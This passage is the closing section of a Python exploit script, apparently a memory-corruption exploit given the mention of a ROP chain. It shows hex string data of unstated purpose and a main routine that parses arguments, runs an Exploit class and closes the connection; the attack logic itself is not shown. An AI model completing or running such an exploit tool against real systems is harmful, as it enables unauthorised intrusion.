                    "3b02483b60d0f11accb70e7c"
                    "af68abf65d7cc6540b8354e3"
                    "798366ec2dec5767a26b68a2"
                    "878422efa10ceb65f0500c50"
                    "366d8f51c68a8f13c3d717cf"
                    "b948f2ef6e68d793f1fabb53"
                )
            )
            # Parse the arguments into a Namespace object
            ns: Namespace = parser.parse_args()
            # Ensure arguments were passed or display help and exit
            if len(argv) == 0:
                parser.print_help()
                exit(0)
            # Instantiate Exploit class using the Namespace packed key-pair values for the constructor
            exploit: Exploit = Exploit(**ns.__dict__)
            # Attempt to execute the exploit
            try:
                exploit.execute()
            except KeyboardInterrupt:
                # Terminate the connection if CTRL+C signal received
                exploit.close()
            except Exception as err:
                # Handle exception using the exploit class
                exploit.error(err)
            finally:
                # Terminate the connection gracefully when complete
                exploit.close()
        except Exception as error:
            # Handle exception in main upon failure
            stderr.write(f"Error in main: {error}")


""" Main method to begin execution """

if __name__ == '__main__':
    Exploit.main()

# TODO: Additional comments to explain exploit process and ROP chain
